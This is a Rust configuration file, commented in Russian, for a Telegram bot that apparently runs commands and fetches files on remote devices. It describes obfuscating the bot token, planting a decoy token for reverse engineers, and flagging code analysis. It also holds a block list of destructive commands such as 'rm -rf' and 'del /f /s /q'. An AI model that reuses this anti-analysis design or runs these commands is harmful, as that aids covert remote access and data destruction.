// ==================== КОНФИГУРАЦИЯ ТЕЛЕГРАМ БОТА ====================
// 
// ВНИМАНИЕ: Токен теперь защищен Multi-Layer обфускацией!
// Настоящий токен разбит на части и зашифрован в модуле token_security.rs
// 
// ======================================================================

/// УСТАРЕЛО: Токен теперь собирается автоматически из зашифрованных частей
/// Настоящий токен получается через token_security::get_secure_bot_token()
/// Этот токен - обманка для введения в заблуждение
#[deprecated(note = "Используйте token_security::get_secure_bot_token() для получения настоящего токена")]
pub const BOT_TOKEN: &str = "DECOY_TOKEN_1234567890:FAKE_OBFUSCATED_TOKEN_FOR_REVERSE_ENGINEERS";

/// УСТАРЕЛО: Chat ID теперь не используется напрямую!
/// Авторизация происходит через Argon2 хеши в модуле auth.rs
/// Для настройки авторизованных пользователей:
/// 1. Запустите программу с флагом --generate-hash YOUR_CHAT_ID
/// 2. Скопируйте полученный хеш в src/auth.rs в AUTHORIZED_HASHES
/// 3. Перекомпилируйте программу
#[deprecated(note = "Используйте модуль auth.rs для безопасной авторизации")]
pub const AUTHORIZED_CHAT_ID: i64 = 0; // НЕ ИСПОЛЬЗУЕТСЯ

// ======================================================================
//                         СИСТЕМНЫЕ НАСТРОЙКИ
// ======================================================================

/// Интервал между проверками новых сообщений (в миллисекундах)
pub const POLLING_INTERVAL_MS: u64 = 1000;

/// Максимальный размер файла для скачивания (в байтах)
pub const MAX_FILE_SIZE: usize = 50 * 1024 * 1024; // 50 MB

/// Максимальный размер текстового ответа (в символах)
pub const MAX_TEXT_RESPONSE: usize = 4096;

/// Таймаут для HTTP запросов (в секундах)
pub const HTTP_TIMEOUT_SECONDS: u64 = 30;

/// Путь для временных файлов
pub const TEMP_DIR: &str = "temp";

/// Maximum concurrent operations
pub const MAX_CONCURRENT_OPERATIONS: usize = 10;

// ======================================================================
//                         СЕТЕВЫЕ НАСТРОЙКИ
// ======================================================================

/// URL для определения внешнего IP
pub const IP_INFO_URL: &str = "https://ipapi.co/json/";

/// Альтернативные URL для IP информации
pub const BACKUP_IP_URLS: &[&str] = &[
    "https://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "https://ifconfig.me/all.json"
];

// ======================================================================
//                         БЕЗОПАСНОСТЬ
// ======================================================================

/// Список запрещенных команд для выполнения
pub const FORBIDDEN_COMMANDS: &[&str] = &[
    "format",
    "del /f /s /q",
    "rm -rf",
    "shutdown",
    "restart",
    "reboot",
    "net user",
    "reg delete"
];

/// Максимальная длина пути к файлу
pub const MAX_PATH_LENGTH: usize = 260;

/// Maximum command length
pub const MAX_COMMAND_LENGTH: usize = 1000;

/// Инициализация системы логирования
pub fn init_logging() {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info)
        .init();
}

/// Проверка валидности конфигурации
pub fn validate_config() -> Result<(), String> {
    // Старая проверка BOT_TOKEN больше не нужна - токен собирается динамически
    
    // Проверяем, что модуль token_security может собрать токен
    match crate::token_security::get_secure_bot_token() {
        Ok(token) => {
            if token.len() < 30 || !token.contains(':') {
                return Err("Не удалось собрать корректный токен из зашифрованных частей!".to_string());
            }
        }
        Err(e) => {
            return Err(format!("Ошибка сборки токена: {}. Возможно обнаружена попытка анализа кода!", e));
        }
    }
    
    Ok(())
}

/// УСТАРЕЛО: Используйте auth::is_authorized_chat() вместо этого
#[deprecated(note = "Используйте auth::is_authorized_chat() для безопасной авторизации")]
#[allow(deprecated)]
pub fn is_authorized_user(chat_id: i64) -> bool {
    chat_id == AUTHORIZED_CHAT_ID
}

/// Check command safety
pub fn is_command_safe(command: &str) -> bool {
    let cmd_lower = command.to_lowercase();
    
    // Проверяем запрещенные команды
    for forbidden in FORBIDDEN_COMMANDS {
        if cmd_lower.contains(&forbidden.to_lowercase()) {
            return false;
        }
    }
    
    // Проверяем длину команды
    if command.len() > MAX_COMMAND_LENGTH {
        return false;
    }
    
    true
}

/// Проверка безопасности пути к файлу
pub fn is_path_safe(path: &str) -> bool {
    // Проверяем длину пути
    if path.len() > MAX_PATH_LENGTH {
        return false;
    }
    
    // Проверяем на опасные последовательности
    let dangerous_patterns = &[
        "..",
        "/system32/",
        "\\system32\\",
        "/windows/",
        "\\windows\\",
        "/boot/",
        "\\boot\\",
    ];
    
    let path_lower = path.to_lowercase();
    for pattern in dangerous_patterns {
        if path_lower.contains(pattern) {
            return false;
        }
    }
    
    true
}

/// Структура для хранения настроек устройства
#[derive(Debug, Clone)]
pub struct DeviceConfig {
    pub device_id: String,
    pub device_name: String,
    pub last_seen: chrono::DateTime<chrono::Utc>,
    pub is_active: bool,
}

impl DeviceConfig {
    pub fn new(device_id: String, device_name: String) -> Self {
        Self {
            device_id,
            device_name,
            last_seen: chrono::Utc::now(),
            is_active: true,
        }
    }
}
